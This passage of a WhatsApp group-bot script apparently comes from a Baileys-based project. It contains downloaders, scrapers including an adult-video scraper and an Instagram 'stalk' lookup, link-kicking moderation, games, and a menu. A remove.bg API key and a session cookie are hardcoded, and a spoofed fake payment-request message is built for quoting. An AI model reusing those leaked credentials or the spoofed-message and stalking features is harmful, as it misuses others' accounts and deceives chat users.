	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await client.getName(i)}\nFN:${await client.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}

//let Zerorecordin = ['recording','composing']
//let Zerorecordinfinal = Zerorecordin[Math.floor(Math.random() * Zerorecordin.length)]

if (global.autoTyping) {
if (command) {
client.sendPresenceUpdate('composing', from)
}
}
if (global.autoRecord) {
if (command) {
client.sendPresenceUpdate('recording', from)
}
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await client.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await client.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await client.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await client.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}

async function sendPoll(jid, text, list) {
client.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function rmbg(buffer) {
let form = new FormData
form.append("size", "auto")
form.append("image_file", fs.createReadStream(buffer), "ntah.webp")
let res = await axios({
  url: "https://api.remove.bg/v1.0/removebg",
  method: "POST",
  data: form,
  responseType: "arraybuffer",
  headers: {
    "X-Api-Key": "dNaWDqPDEuzQTHDba6TACk57",
    ...form.getHeaders()
  }
})
return res.data
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime () {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
                hasil.push({
                    link: $(h).find('a').attr('href'),
                    gambar: $(h).find('img').attr('data-src'),
                    karakter: $(h).find('div.char-name').text().trim(),
                    anime: $(h).find('div.anime-title').text().trim(),
                    episode: $(h).find('div.meta').text(),
                    up_at: $(h).find('small.meta').text(),
                    quotes: $(h).find('div.quote').text().trim()
                })
            })
            resolve(hasil)
        }).catch(reject)
    })
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
                hasil.push({
                    title: $(b).find('header > h2').text(),
                    link: $(b).find('header > h2 > a').attr('href'),
                    category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
                    share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
                    views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
                    type: $(b).find('source').attr('type') || 'image/jpeg',
                    video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
                    video_2: $(b).find('video > a').attr('href') || ''
                })
            })
            resolve(hasil)
        })
    })
}	

async function GetBuffer(url) {
	return new Promise(async (resolve, reject) => {
		let buffer;
		await jimp
			.read(url)
			.then((image) => {
				image.getBuffer(image._originalMime, function (err, res) {
					buffer = res;
				});
			})
			.catch(reject);
		if (!Buffer.isBuffer(buffer)) reject(false);
		resolve(buffer);
	});
}
function GetType(Data) {
	return new Promise((resolve, reject) => {
		let Result, Status;
		if (Buffer.isBuffer(Data)) {
			Result = new Buffer.from(Data).toString("base64");
			Status = 0;
		} else {
			Status = 1;
		}
		resolve({
			status: Status,
			result: Result,
		});
	});
}
async function Cartoon(url) {
	return new Promise(async (resolve, reject) => {
		let Data;
		try {
			let buffer = await GetBuffer(url);
			let Base64 = await GetType(buffer);
			await axios
				.request({
					url: "https://access1.imglarger.com/PhoAi/Upload",
					method: "POST",
					headers: {
						connection: "keep-alive",
						accept: "application/json, text/plain, */*",
						"content-type": "application/json",
					},
					data: JSON.stringify({
						type: 11,
						base64Image: Base64.result,
					}),
				})
				.then(async ({ data }) => {
					let code = data.data.code;
					let type = data.data.type;
					while (true) {
						let LopAxios = await axios.request({
							url: "https://access1.imglarger.com/PhoAi/CheckStatus",
							method: "POST",
							headers: {
								connection: "keep-alive",
								accept: "application/json, text/plain, */*",
								"content-type": "application/json",
							},
							data: JSON.stringify({
								code: code,
								isMember: 0,
								type: type,
							}),
						});
						let status = LopAxios.data.data.status;
						if (status == "success") {
							Data = {
								message: "success",
								download: {
									full: LopAxios.data.data.downloadUrls[0],
									head: LopAxios.data.data.downloadUrls[1],
								},
							};
							break;
						} else if (status == "noface") {
							Data = {
								message: "noface",
							};
							break;
						}
					}
				});
		} catch (_error) {
			Data = false;
		} finally {
			if (Data == false) {
				reject(false);
			}
			resolve(Data);
		}
	});
}
function randomId() {
	return Math.floor(100000 + Math.random() * 900000);
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

async function replyprem(teks) {
    m.reply(`This feature is for premium user, contact the owner to become premium user`)
}

        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await client.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await client.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }

// Anti Link
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return ZeroStickBotAdmin()
        let gclink = (`https://chat.whatsapp.com/`+await client.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return client.sendMessage(from, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`})
        if (isAdmins) return client.sendMessage(from, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`})
        if (ZeroTheCreator) return client.sendMessage(from, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nOwner has sent a link, owner is free to post any link`})
        kice = m.sender
        await client.sendMessage(from,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			client.sendMessage(from, {text:`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending group link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }

 // Antiwame by Zero
  if (antiWame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (ZeroTheCreator) return m.reply(bvl)
kice = m.sender
        await client.sendMessage(from,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
client.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (ZeroTheCreator) return m.reply(bvl)
kice = m.sender
        await client.sendMessage(from,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
client.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antivirtex by Zero
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return ZeroStickBotAdmin()
          await client.sendMessage(from,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			client.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by Zero
if (antiToxic)
if (BadZero.includes(messagesD)) {
if (m.text) {
bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin/owner that's why i won't kick you😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (ZeroTheCreator) return m.reply(bvl)
        await client.sendMessage(from,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			await client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
client.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
}
//antilink youtube video by Zero
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (ZeroTheCreator) return m.reply(bvl)
        await client.sendMessage(from,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
client.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by Zero
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (ZeroTheCreator) return m.reply(bvl)
        await client.sendMessage(from,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
client.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by Zero
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (ZeroTheCreator) return m.reply(bvl)
        await client.sendMessage(from,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
client.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by Zero
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (ZeroTheCreator) return m.reply(bvl)
        await client.sendMessage(from,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
client.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by Zero
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (ZeroTheCreator) return m.reply(bvl)
        await client.sendMessage(from,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
client.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by Zero
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (ZeroTheCreator) return m.reply(bvl)
        await client.sendMessage(from,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
client.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by Zero
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (ZeroTheCreator) return m.reply(bvl)
        await client.sendMessage(from,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
client.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending twitter link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by Zero
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (ZeroTheCreator) return m.reply(bvl)
        await client.sendMessage(from,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
client.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

//menu image randomizer
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
emoji.get(satu)
.then(emoji => {
client.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: client.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, client.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
client.ev.emit('messages.upsert', msg)
}

switch (command) {
case '/ttc': case '/ttt': case '/tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room13 => room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender))) return replygcZero(`You Are Still In The Game`)
            let room13 = Object.values(this.game).find(room13 => room13.state === 'WAITING' && (text ? room13.name === text : true))
            if (room13) {
            room13.o = m.chat
            room13.game.playerO = m.sender
            room13.state = 'PLAYING'
            let arr = room13.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Waiting @${room13.game.currentTurn.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if (room13.x !== room13.o) await client.sendText(room13.x, str, m, { mentions: parseMention(str) } )
            await client.sendText(room13.o, str, m, { mentions: parseMention(str) } )
            } else {
            room13 = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room13.name = text
            replygcZero('Waiting For Partner' + (text ? ` Type The Command Below ${prefixo}${command} ${text}` : ''))
            this.game[room13.id] = room13
            }
            }
            break
            case '/delttc': case '/delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            client.sendText(m.chat, `Successfully deleted TicTacToe session`, m)
            } else if (!this.game) {
            replygcZero(`Session TicTacToe🎮 does not exist`)
            } else throw '?'
            } catch (e) {
            replygcZero('damaged')
            }
            }
            break
            case '/suitpvp':case '/rps': case '/rockpaperscissors':case '/suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygcZero(`Complete your previous game`)
	    if (m.mentionedJid[0] === m.sender) return replygcZero(`Can't play with myself !`)
            if (!m.mentionedJid[0]) return replygcZero(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefixo}suit @${owner}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygcZero(`The person you are challenging is playing suit with someone else :(`)
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} *Challenged* @${m.mentionedJid[0].split`@`[0]} *to play suit*

*Hi* @${m.mentionedJid[0].split`@`[0]} *Please type accept to accept or type reject to reject`
            this.suit[id] = {
            chat: await client.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) client.sendText(m.chat, `_Suit time out_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
	case '/public': {
                if (!ZeroTheCreator) return ZeroStickOwner()
                client.public = true
                replygcZero('*Successful in Changing To Public Usage*')
            }
            break
            case '/self': {
                if (!ZeroTheCreator) return ZeroStickOwner()
                client.public = false
                replygcZero('*Successful in Changing To Self Usage*')
            }
            break
case '/rentbot': {
if (m.isGroup) return ZeroStickPrivate()

rentfromZero(client, m, from)
}
break
case '/rentbotlist': 
try {
let user = [... new Set([...global.conns.filter(client => client.user).map(client => client.user)])]
te = "*Rentbot List*\n\n"
for (let i of user){
y = await client.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
client.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
replygcZero(`There are no users who have rented the bot yet`)
}
break
case '/shutdown':
if (!ZeroTheCreator) return ZeroStickOwner()
replygcZero(`Ba bye...`)
await sleep(3000)
process.exit()
break
case '/owner': {
const repf = await client.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
client.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`, mentions: [sender]}, { quoted: repf })
}
break
case '/alive': case '/panel': case '/list': case '/menu': case '/help':{
	        let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let timestampe = speed()
            let latensie = speed() - timestampe
            Zeroezy = `┌─❖
│ Hi 👋 
└┬❖  ${pushname} 
┌┤✑  ${Zeroytimewisher} 😄
│└────────────┈ ⳹
│
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊        
│𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
│𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
│𝗕𝗼𝘁 : ${global.botname}
│𝗢𝘄𝗻𝗲𝗿 𝗡𝗼: ${ownernumber}
│𝗣𝗿𝗲𝗳𝗶𝘅 :  / 
│𝗠𝗼𝗱𝗲 : ${client.public ? 'Public' : `Self`}
│𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝗡𝗮𝗺𝗲 : ${pushname}
│𝗡𝘂𝗺𝗯𝗲𝗿 : @${me.split('@')[0]}
│𝗣𝗿𝗲𝗺𝗶𝘂𝗺 : ${isPrem ? '✅' : `❌`}
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝗧𝗶m𝗲 : ${xtime}
│𝗗𝗮𝘁𝗲 : ${xdate}
└┬────────────┈ ⳹
┌└─────────────┈ ⳹
│❏/allmenu
│❏/downloadmenu
│❏/funmenu
│❏/aimenu
│❏/groupmenu
│❏/ownermenu
│❏/photooxymenu
│❏/textpromenu
│❏/ephoto360menu
│❏/animemenu
│❏/stickermenu
│❏/databasemenu
│❏/stalkermenu
│❏/bugmenu
│❏/othermenu
└─────────────────┈ ⳹`
            let ments = [ownernya, me, mark]        
           client.sendMessage(from, { 
text: Zeroezy,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./Media/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
           }
           break
           case '/allmenu': {
